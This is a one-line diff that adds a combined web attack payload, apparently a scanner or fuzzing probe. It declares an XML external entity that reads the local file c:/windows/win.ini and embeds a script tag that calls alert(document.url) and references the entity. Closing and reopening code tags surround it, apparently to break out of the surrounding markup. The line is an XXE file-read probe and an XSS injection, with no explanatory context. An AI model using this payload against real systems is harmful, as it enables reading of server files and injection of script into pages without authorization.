@@ -1,0 +1,1 @@
+<!DOCTYPE foo [<!ENTITY xxe6mzc1 SYSTEM "file:///c:/windows/win.ini"> ]></code> <script> alert(document.url)&xxe6mzc1;</script><code>
